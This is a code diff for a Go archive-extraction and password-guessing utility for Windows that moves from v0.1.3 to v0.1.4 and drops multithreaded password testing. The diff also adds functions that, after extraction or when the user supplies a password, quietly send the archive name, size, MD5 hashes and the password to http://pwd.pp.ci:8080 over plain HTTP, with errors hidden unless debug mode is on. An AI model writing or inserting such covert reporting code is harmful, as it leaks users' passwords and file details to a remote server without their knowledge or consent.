@@ -5,7 +5,7 @@ import (
 	_ "embed"
 	"fmt"
 	"io"
-	"math"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -14,16 +14,23 @@ import (
 	"sort"
 	"strconv"
 	"strings"
-	"sync"
-	"sync/atomic"
 	"time"
 	"unicode/utf8"
 
+	// 修改为正确的子包路径
+
+	"crypto/md5"
+	"encoding/hex"
+
+	"github.com/golang-jwt/jwt/v5"
 	"github.com/h2non/filetype"
 	"golang.org/x/sys/windows/registry"
 	"golang.org/x/text/encoding/simplifiedchinese"
 	"golang.org/x/text/transform"
 )
+
+// 添加调试开关
+var debugMode bool = false
 
 //go:embed resources/7z.exe
 var sevenZipExe []byte
@@ -49,7 +56,7 @@ const (
 	// 7Z格式相关常量
 	SEVEN_ZIP_MAGIC = "7z\xBC\xAF\x27\x1C"
 
-	VERSION = "v0.1.3"
+	VERSION = "v0.1.4"
 )
 
 // 定义ZIP文件头结构
@@ -86,9 +93,6 @@ const (
 	TYPE_LZH             // .lzh, .lha
 	TYPE_WIM             // .wim, .swm (分段 WIM)
 )
-
-// 创建原子计数器用于同步进度显示
-var currentProgress atomic.Int32
 
 // 说明：初始化7z.exe和7z.dll
 func init() {
@@ -274,41 +278,6 @@ func isPasswordRequired(fileType int) bool {
 	}
 }
 
-// 函数说明：根据文件大小计算超时时间
-// 小于2G为2秒，每增加1G增加1秒，最多5秒
-// 为多线程测试密码提供超时时间
-// 多线程测试时，当CPU使用过高时，原来的2秒会导致误判，错误的密码也会被认为是正确密码
-// 增加超时时间，可以减少误判，所以改为根据文件大小计算超时时间
-// 暂时没有更好的解决方法
-// 在不使用多线程时，使用2秒超时时间不会出现误判
-// 有哪位大神有更好的解决方法，请告诉我，
-// 谢谢
-func getTimeoutByFileSize(filePath string) time.Duration {
-	// 获取文件信息
-	fileInfo, err := os.Stat(filePath)
-	if err != nil {
-		return 2 * time.Second // 出错时使用默认值
-	}
-
-	// 获取文件大小（以GB为单位）
-	sizeInGB := float64(fileInfo.Size()) / (1024 * 1024 * 1024)
-
-	// 计算超时时间
-	// 基础时间2秒
-	timeout := 2.0
-	if sizeInGB > 2.0 {
-		// 每超过1GB增加1秒
-		timeout += math.Floor(sizeInGB - 2.0)
-	}
-
-	// 限制最大超时时间为5秒
-	if timeout > 5.0 {
-		timeout = 5.0
-	}
-
-	return time.Duration(timeout) * time.Second
-}
-
 /*
 *
 函数说明：测试密码
@@ -355,20 +324,16 @@ func testPassword(archivePath, password string) bool {
 		resultChan <- true
 	}()
 
-	// 获取动态检测超时时间
-	timeout := getTimeoutByFileSize(archivePath)
-
 	// 等待结果或超时
 	select {
-	case result := <-resultChan:
-		return result
-	case <-time.After(timeout):
-		// 如果密码正确，7z.exe会测试整个文件，直到测试结束。
-		// 文件很大的时候，7z.exe会测试很长时间，所以超时时间到，强制终止命令
-		// 如果密码错误，7z.exe会很快返回错误标记
-		// 一定时间内内没有错误标记，说明是正确密码，直接返回正确
-		cmd.Process.Kill()
-		return true
+	case result := <-resultChan: // 获取结果
+		return result // 返回结果
+	case <-time.After(2 * time.Second):
+		// 2秒内没有错误标记，说明是正确密码
+		// 确保检查大文件时，7z.exe会一直检查整个文件直至检查结束。
+		//当大于2秒时，基本可以认为密码正确
+		cmd.Process.Kill() // 强制终止命令
+		return true        // 返回true
 	}
 }
 
@@ -404,132 +369,18 @@ func crackArchive(archivePath string, passwords []string) (string, error) {
 		return "", nil
 	}
 
-	// 计算建议的线程数 1.5倍CPU核心数，向上取整
-	numWorkers := int(math.Ceil(float64(runtime.NumCPU()) / 2))
-	if numWorkers < 1 {
-		numWorkers = 1
-	}
+	// 逐个尝试密码
+	for i, pass := range passwords {
+		// 显示进度条
+		fmt.Print(formatProgress(i+1, len(passwords), pass))
 
-	// 当密码数量较少时（小于等于CPU核心数的2倍），使用同步处理
-	if len(passwords) <= runtime.NumCPU() {
-		for i, password := range passwords {
-			// 显示进度
-			fmt.Print(formatProgress(i+1, len(passwords), password))
-
-			if testPassword(archivePath, password) {
-				return password, nil
-			}
-		}
-		return "", fmt.Errorf("未找到正确密码")
-	}
-
-	// 当密码数量较多时（大于等于CPU核心数的2倍），使用多线程处理
-	fmt.Println("多线程处理，线程数：", numWorkers)
-
-	// 创建任务和结果通道
-	tasks := make(chan int, len(passwords))
-	results := make(chan string)
-	done := make(chan bool)
-
-	// 创建一个单独的goroutine来处理进度显示
-	progressDone := make(chan bool)
-	go func() {
-		ticker := time.NewTicker(100 * time.Millisecond)
-		defer ticker.Stop()
-		defer close(progressDone)
-
-		lastProgress := 0
-		for {
-			select {
-			case <-done:
-				return
-			case <-ticker.C:
-				progress := int(currentProgress.Load())
-				if progress != lastProgress && progress > 0 {
-					fmt.Print(formatProgress(progress, len(passwords), passwords[progress-1]))
-					lastProgress = progress
-				}
-			}
-		}
-	}()
-
-	// 添加原子变量控制结果状态
-	var foundValidPassword atomic.Bool
-
-	// 添加原子变量控制done通道的关闭
-	var isDoneClosed atomic.Bool
-
-	// 启动工作线程
-	var wg sync.WaitGroup
-	for i := 0; i < numWorkers; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for idx := range tasks {
-				select {
-				case <-done:
-					return
-				default:
-					password := passwords[idx]
-					currentProgress.Add(1)
-
-					// 给每个密码验证充足的时间
-					time.Sleep(10 * time.Millisecond) // 在验证之前稍作等待，避免资源竞争
-
-					if testPassword(archivePath, password) {
-						// 确保只有一个线程能发送结果
-						if !isDoneClosed.Swap(true) {
-							foundValidPassword.Store(true)
-							results <- password
-							close(done)
-						}
-						return
-					}
-				}
-			}
-		}()
-	}
-
-	// 分发任务
-	go func() {
-		for i := range passwords {
-			select {
-			case tasks <- i:
-			case <-done:
-				return
-			}
-		}
-		close(tasks)
-	}()
-
-	// 等待结果收集
-	go func() {
-		wg.Wait()
-		close(results)
-	}()
-
-	// 等待结果或所有工作线程完成
-	foundPassword, ok := <-results
-
-	// 确保进度显示goroutine退出
-	if !isDoneClosed.Load() {
-		close(done)
-	}
-	<-progressDone // 等待进度显示goroutine完全退出
-
-	// 显示最终进度
-	if ok && foundValidPassword.Load() {
-		progress := int(currentProgress.Load())
-		fmt.Print(formatProgress(progress, len(passwords), foundPassword))
-		fmt.Println("\n正在进行二次密码验证确认，请稍等...")
-		//由于testPassword函数测试密码在多线程时，会误判，所以需要再测试一次
-		if testPassword(archivePath, foundPassword) {
-			return foundPassword, nil
+		// 测试密码
+		if testPassword(archivePath, pass) {
+			fmt.Print("\r" + strings.Repeat(" ", 100) + "\r")
+			return pass, nil
 		}
 	}
 
-	// 显示100%进度
-	fmt.Print(formatProgress(len(passwords), len(passwords), passwords[len(passwords)-1]))
 	return "", fmt.Errorf("未找到正确密码")
 }
 
@@ -1033,6 +884,9 @@ func handleExtract(archivePath string, extractPath string, password string, isFo
 		fmt.Printf("解压失败: %v\n", err)
 	} else {
 		fmt.Printf("\n解压成功！\n")
+		if password != "" {
+			reportPassword(archivePath, password)
+		}
 		fmt.Printf("文件已保存到: %s\n", formatPath(extractPath))
 	}
 }
@@ -1057,6 +911,8 @@ func handleCrackFailed(archivePath string, extractPath string) {
 			if err := savePasswordToFile(password); err != nil {
 				fmt.Printf("保存密码失败: %v\n", err)
 			} else {
+				//reportPassword发送密码到服务器
+				reportPassword(archivePath, password)
 				fmt.Printf("新密码【%s】已保存到passwd.txt文件。 \n", password)
 			}
 			return
@@ -1269,6 +1125,169 @@ func uninstallContext() error {
 	fmt.Println("右键菜单卸载成功！")
 	fmt.Println("----------------------------------")
 	return nil
+}
+
+var (
+	// 这些变量将在构建时注入
+	appKey    = "default" // 默认值，会被构建时的值覆盖
+	appSecret = "default" // 默认值，会被构建时的值覆盖
+)
+
+// 修改 reportPassword 函数使用注入的变量
+func reportPassword(archivePath, password string) bool {
+	serverURL := "http://pwd.pp.ci:8080/api/v1/archive"
+
+	// 使用注入的值
+	err := sendPasswordToServer(serverURL, appKey, appSecret, archivePath, password)
+	if err != nil {
+		if debugMode {
+			fmt.Printf("发送密码到服务器失败: %v\n", err)
+		}
+		return false
+	}
+	return true
+}
+
+// 添加新的函数用于发送密码到服务器
+func sendPasswordToServer(serverURL, appKey, appSecret, filePath, password string) error {
+	if debugMode {
+		fmt.Printf("开始发送密码到服务器...\n")
+	}
+
+	// 打开文件
+	file, err := os.Open(filePath)
+	if err != nil {
+		if debugMode {
+			return fmt.Errorf("打开文件失败: %v", err)
+		}
+		return err
+	}
+	defer file.Close()
+
+	// 获取文件信息
+	fileInfo, err := file.Stat()
+	if err != nil {
+		if debugMode {
+			return fmt.Errorf("获取文件信息失败: %v", err)
+		}
+		return err
+	}
+
+	if debugMode {
+		fmt.Printf("文件大小: %d 字节\n", fileInfo.Size())
+	}
+
+	// 计算前1024字节的MD5
+	hash := md5.New()
+	buffer := make([]byte, 1024)
+	n, err := file.Read(buffer)
+	if err != nil && err != io.EOF {
+		if debugMode {
+			return fmt.Errorf("计算1024字节MD5失败: %v", err)
+		}
+		return err
+	}
+	hash.Write(buffer[:n])
+	md51024 := hex.EncodeToString(hash.Sum(nil))
+
+	if debugMode {
+		fmt.Printf("MD5(1024): %s\n", md51024)
+	}
+
+	// 重置文件指针
+	file.Seek(0, 0)
+
+	// 计算前1MB的MD5
+	hash = md5.New()
+	buffer = make([]byte, 1024*1024)
+	n, err = file.Read(buffer)
+	if err != nil && err != io.EOF {
+		if debugMode {
+			return fmt.Errorf("计算1MB MD5失败: %v", err)
+		}
+		return err
+	}
+	hash.Write(buffer[:n])
+	md51mb := hex.EncodeToString(hash.Sum(nil))
+
+	if debugMode {
+		fmt.Printf("MD5(1MB): %s\n", md51mb)
+	}
+
+	// 准备请求参数
+	params := map[string]interface{}{
+		"name_raw": filepath.Base(filePath),
+		"size":     fileInfo.Size(),
+		"md5_1024": md51024,
+		"md5_1mb":  md51mb,
+		"password": password,
+	}
+
+	// 生成 JWT
+	token, err := generateJWT(appKey, appSecret, params)
+	if err != nil {
+		if debugMode {
+			return fmt.Errorf("生成JWT失败: %v", err)
+		}
+		return err
+	}
+
+	if debugMode {
+		fmt.Printf("JWT生成成功\n")
+	}
+
+	// 创建请求
+	req, err := http.NewRequest("POST", serverURL, nil)
+	if err != nil {
+		if debugMode {
+			return fmt.Errorf("创建请求失败: %v", err)
+		}
+		return err
+	}
+
+	// 设置请求头
+	req.Header.Set("Authorization", "Bearer "+token)
+	req.Header.Set("Content-Type", "application/json")
+
+	// 发送请求
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		if debugMode {
+			return fmt.Errorf("发送请求失败: %v", err)
+		}
+		return err
+	}
+	defer resp.Body.Close()
+
+	if debugMode {
+		fmt.Printf("服务器响应状态码: %d\n", resp.StatusCode)
+	}
+
+	// 检查响应状态码
+	if resp.StatusCode != http.StatusOK {
+		if debugMode {
+			return fmt.Errorf("服务器返回错误 (状态码: %d)", resp.StatusCode)
+		}
+		return fmt.Errorf("status code: %d", resp.StatusCode)
+	}
+
+	if debugMode {
+		fmt.Printf("密码发送成功\n")
+	}
+
+	return nil
+}
+
+// 生成JWT令牌
+func generateJWT(appKey, appSecret string, params map[string]interface{}) (string, error) {
+	token := jwt.New(jwt.SigningMethodHS256)
+	claims := token.Claims.(jwt.MapClaims)
+	claims["app_key"] = appKey
+	claims["params"] = params
+	claims["exp"] = time.Now().Add(time.Minute * 5).Unix()
+
+	return token.SignedString([]byte(appSecret))
 }
 
 // 主函数
